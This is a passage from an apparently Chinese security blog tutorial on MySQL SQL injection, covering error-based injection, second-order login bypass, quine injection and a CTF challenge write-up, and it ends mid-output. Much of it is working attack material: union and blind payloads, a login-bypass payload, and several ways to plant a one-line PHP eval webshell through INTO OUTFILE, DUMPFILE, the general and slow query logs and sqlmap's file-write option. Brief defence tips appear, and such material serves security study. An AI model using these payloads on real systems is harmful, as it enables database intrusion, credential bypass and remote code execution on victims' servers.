class="line">exp()          函数返回e指数X的幂值,当传递大于709的值时,会引起溢出错误  exp(~(select * from(select user())a))</span><br><span class="line">geometrycollection() multipoint() polygon() multipolygon() linestring() multilinestring() 几何函数报错注入</span><br></pre></td></tr></table></figure><p>floor()   mysql的一个取整函数</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union <span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322134455656.png" alt="image-20230322134455656"></p><p>分析：</p><p>rand()函数可以产生一个在0和1之间的随机数</p><p> <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322111730857.png" alt="image-20230322111730857"></p><p> <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322111738048.png" alt="image-20230322111738048"></p><p>但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，称之为伪随机</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1838324-20200430005415464-2095664437.png" alt="img" style="zoom: 80%;" />floor函数的作用就是返回小于等于括号内该值的最大整数，rand()本身是返回0~1的随机数，但在后面*2就变成了返回0~2之间的随机数，配合上floor函数就可以产生确定的两个数，即0和1，并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值此处的czs表为含有四行数据的表，结合上述的函数，每次产生的随机数列都是 0 1 1 0![img](https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1838324-20200430013827951-1006107102.png)<p>综合使用产生报错select count(*),floor(rand(0)*2)x from czs group by x;</p><p>当count(*)和group by x同时执行时，就会爆出duplicate entry错误, 通过 floor 报错的方法来爆数据的本质是 group by 语句的报错</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322133316186.png" alt="image-20230322133316186" style="zoom:67%;" /><p>mysql报错注入修复方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 屏蔽能造成报错注入的各种函数</span><br><span class="line">2. 对输入长度做限制，对用户输入做预处理</span><br><span class="line">3. 对各种报错注入的返回结果，统一返回至不包含任何错误提示信息的回显页面</span><br><span class="line">4.使用数据库防火墙，精准分析业务SQL和危险SQL，拦截SQL注入等危险语句</span><br></pre></td></tr></table></figure><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>在输入的时候进行了处理，但是在取出数据的时候没有进行检验</p><p><strong>用户名和密码分开检验</strong></p><p>也就是说它是先检验username，把username对应的所有字段都查出来后，再检验密码能不能和查出来的密码对上，检验密码的过程可能会有一个md5的加密</p><p>登录验证的流程已经说清楚了，先做一个小测试</p><p>如果执行一个查询语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = 0 union select 1,&#x27;admin&#x27;,md5(&#x27;abc&#x27;); </span><br></pre></td></tr></table></figure><p>则会返回以下结果：</p><p><img src="https://upload-images.jianshu.io/upload_images/20163356-f177be36d62355a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790/format/webp" alt="img"></p><p>这样的话思路就很清晰了，我们先在用户名处输入<code>1&#39; union select 1,&#39;admin&#39;,&#39;900150983cd24fb0d6963f7d28e17f72&#39;#</code>，得到的是上图的结果。密码处我们再输入一个上图密码md5加密之前的密码也就是abc 即可绕过检验，成功登陆admin账户</p><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">900150983</span>cd24fb0d6963f7d28e17f72<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">password = abc</span></span><br></pre></td></tr></table></figure><h4 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h4><h5 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h5><p>条件：</p><blockquote><p>1、知道web绝对路径</p><p>2、有文件写入权限(一般情况只有root用户有)</p><p>3、数据库开启了<code>secure_file_priv</code>设置</p></blockquote><p>secure_file_priv    查询语句：<code>show global variables like &quot;secure%&quot;; </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NULL   禁止限制操作 </span><br><span class="line">C:\    值为某一目录，则只能操作该目录下的文件 </span><br><span class="line">&#x27;&#x27;     为空，则表示不对读写文件进行限制，即可以写入任意磁盘文件(区分NULL)  </span><br></pre></td></tr></table></figure><p>secure_file_priv只能通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322183051771.png" alt="image-20230322183051771" style="zoom:45%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322135516187.png" alt="image-20230322135516187" style="zoom:67%;" /><p>然后就能用<code>select into outfile</code>写入<code>webshell</code></p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322140000635.png" alt="image-20230322140000635" style="zoom:50%;" /><p>常见手法：</p><p>联合注入写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into outfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><code>dumpfile</code>函数写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into dumpfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>lines terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines terminated by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//lines terminated by 可以理解为以每行终止的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>lines starting by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines starting by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用 lines starting by 语句拼接webshell的内容。lines starting by可以理解为以每行开始的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>fields terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/work/shell.php&#x27;</span> fields terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容  fields terminated by可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>columns terminated by 写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> <span class="variable constant_">COLUMNS</span> terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容 columns terminated by 可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure><p>sqlmap写入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入到 /tmp 目录下 (要写的文件，必须在kali本机里有)</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;user-info-php-submit-button=View+Account+Details&quot;</span> -p <span class="string">&#x27;username&#x27;</span>  --file-write=<span class="string">&quot;shell.php&quot;</span>  --file-dest=<span class="string">&quot;/tmp/shell.php&quot;</span></span><br></pre></td></tr></table></figure><p>读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;文件名&#x27;)；</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322141028688.png" alt="image-20230322141028688" style="zoom:67%;" /><h5 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h5><p>MySQL的两个全局变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">general_log      日志保存状态，一共有两个值（ON/OFF）</span><br><span class="line">general_log_file 日志的保存路径</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322161018141.png" alt="image-20230322161018141" style="zoom: 67%;" /><p>如果目前这个<code>general_log</code>为off状态，那么日志就没有被记录进去，所以要先打开这个全局变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br></pre></td></tr></table></figure><p>打开过后，不管sql语句是否正确，日志文件中都会记录我们写的sql语句</p><p>接下来修改<code>general_log_file</code>，可以直接通过SQL语句修改，并且必须修改为如<code>.php</code>后缀的文件，不然马不能被解析</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\log.php&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180312855.png" alt="image-20230322180312855" style="zoom: 50%;" /><p><code>接下来使用 select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180736193.png" alt="image-20230322180736193"></p><p>但是最后也要考虑能不能成功的连接到马，像如果<code>secure_file_priv</code>固定为C:\，而网站是搭在D盘上，那把<code>general_log_file</code>修改为C盘下的文件也连接不到，除非还有文件包含漏洞等</p><p>这里还得修改日志文件log.php的路径，让他在网站目录下才能成功连接</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182458681.png" alt="image-20230322182458681" style="zoom: 67%;" /><p>成功连接</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182442934.png" alt="image-20230322182442934" style="zoom: 50%;" /><h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p>条件比较苛刻</p><p>（1）union注入在这里行不通。要日志写马能够连接必须要修改<code>general_log_file</code>为比如<code>php</code>后缀的文件，不然马不能被解析，所以必须要先用到<code>set global general_log_file=&#39;xx.php&#39;;</code>，那么union注入就没机会了，union基本都是<code>?id=1 union select 1,2,select &#39;&#39;;</code>这样，不能执行<code>set</code>的</p><p>（2）有堆叠注入，要先<code>?id=1;set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>?id=1;select &#39;木马&#39;;</code></p><p>不过要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。</p><p>（3）再者就是成功登录到别人的数据库里了，先<code>set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>select &#39;木马&#39;;</code></p><p>（4）没有对 <code>&#39; </code>和 <code>&quot;</code> 进行过滤，因为outfile后面的物理路径必须要有引号</p><h5 id="慢查询日志写shell"><a href="#慢查询日志写shell" class="headerlink" title="慢查询日志写shell"></a>慢查询日志写shell</h5><p>MySQL日志主要包含: 错误日志、查询日志、慢查询日志、事务日志。在 5.6.34版本以后secure_file_priv的值默认为NULL</p><p>MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，long_query_time的默认值为10，意思是运行10S以上的语句。运行时间超过long_query_time值的SQL会被记录到慢查询日志中。使用慢查询主要针对日志量庞大，通过日志文件getshell出现问题的情况</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;</span>; 日志路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;   启用慢查询日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> log_queries_not_using_indexes<span class="operator">=</span><span class="keyword">on</span>;</span><br></pre></td></tr></table></figure><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322194438585.png" alt="image-20230322194438585" style="zoom: 67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log_file=&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;;   //原理同上</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; or sleep(10);</span><br></pre></td></tr></table></figure><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193527824.png" alt="image-20230322193527824"></p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193550168.png" alt="image-20230322193550168"></p><p>若对敏感字符进行过滤，可以采用字符串拼接(concat) 字符串替换(replace)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file =CONCAT(&quot;/var/www/html/shell.p&quot;,&quot;hp&quot;); </span><br><span class="line">set global general_log_file =REPLACE(&quot;/var/www/html/shell.jpg&quot;,&quot;jpg&quot;,&quot;php&quot;); </span><br></pre></td></tr></table></figure><h4 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h4><p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种使得输入的<code>sql</code>语句和输出的<code>sql</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//官方payload</span><br><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)</span><br></pre></td></tr></table></figure><h4 id="防御注入"><a href="#防御注入" class="headerlink" title="防御注入"></a>防御注入</h4><p>预编译和参数绑定</p><p>转义单引号，统一php和Mysql的字符集</p><p>过滤敏感字符</p><h5 id="第三届第五空间yet-another-mysql-injection"><a href="#第三届第五空间yet-another-mysql-injection" class="headerlink" title="第三届第五空间yet_another_mysql_injection"></a>第三届第五空间<code>yet_another_mysql_injection</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面<code>php</code>代码逻辑实现了一个通过<code>POST</code>提交登录请求的方法，要求<code>username</code>必须为<code>admin</code>，密码需要与查询到的<code>password</code>一致，才能拿到<code>flag</code>。</p><p>其实如果直接看这道题其实给出了所使用的<code>sql</code>语句，在语句中给出了表<code>user</code>，包括黑名单也在<code>checkSql</code>中都已经给出了，那么按理看这不是一个困难的注入，可以当成一个简单的盲注。通过使用<code>like</code>替换<code>=</code>，<code>benchmark</code>（或者其他笛卡儿积等）替换<code>sleep</code>，<code>mid</code>替换<code>substr</code>，<code>/**/</code>替换<code>Space</code>，使用如下<code>paload</code>即可完成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> if((<span class="keyword">select</span> ascii(mid((<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema <span class="keyword">like</span> database()),&#123;&#125;,<span class="number">1</span>)) <span class="keyword">like</span> &#123;&#125;),(<span class="keyword">select</span> benchmark(<span class="number">4999999</span>,md5(<span class="string">&#x27;test&#x27;</span>))),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><p>但是很遗憾，这样注出来<code>user</code>表中没有密码。</p><p>如果仔细看题目中这个比较判断的逻辑，我们就可以发现端倪。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br></pre></td></tr></table></figure><p>简单来看，要求的是执行<code>$sql</code>的结果与<code>$password</code>相同，那么除了正常逻辑的密码相同会产生相等，如果我们的输入与最后的结果相等，那么一样可以绕过验证。这种技术就是<code>Quine</code>。</p><p>示例payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>)<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span>ch3ns1r#</span><br></pre></td></tr></table></figure><p>这样看起来不是很清楚，我们接下来从内层一步一步拆开看。</p><p>从大结构上，这段payload是由两个大REPLACE完成的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPLACE ( string_expression , string_pattern , string_replacement )</span><br><span class="line">即将string_expression中所有string_pattern替换为string_replacement</span><br></pre></td></tr></table></figure><p>内层<code>REPLACE</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>))</span><br></pre></td></tr></table></figure><p>我们暂且把它当作<code>A</code>，这里面有个字符串：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>我们暂且把它当作<code>B</code>。</p><p>简化一下最初的<code>payload</code>就是这个样子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(A,<span class="type">CHAR</span>(<span class="number">46</span>),B)<span class="comment">/**/</span><span class="keyword">AS</span><span class="comment">/**/</span>ch3ns1r#</span><br><span class="line">其中：</span><br><span class="line">A：REPLACE(B,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>))</span><br><span class="line">B：</span><br><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>到这里应该就看的比较清楚了，有点像套娃。<code>A</code>这个形式就是<code>Quine</code>的基本形式，可以描述为如下形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure><p><code>str</code>可描述为如下形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br></pre></td></tr></table></figure><p>这样运算后，最后的结果又是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure><p>我们举个例子加深理解，设间隔符为<code>&#39;.&#39;</code>，编码的间隔符为<code>CHAR(46)</code>，那么<code>str</code>为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;.&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;.&quot;)</span><br></pre></td></tr></table></figure><p>放入最后的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>执行的结果为（先执行的<code>CHAR(46)</code>）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>（注意以上的语句还没有考虑存在单双引号的情况）</p><p>这样就达到了输入与输出一致的效果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> MySQL  localhost:<span class="number">3306</span> ssl  <span class="keyword">SQL</span> <span class="operator">&gt;</span> <span class="keyword">SELECT</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span 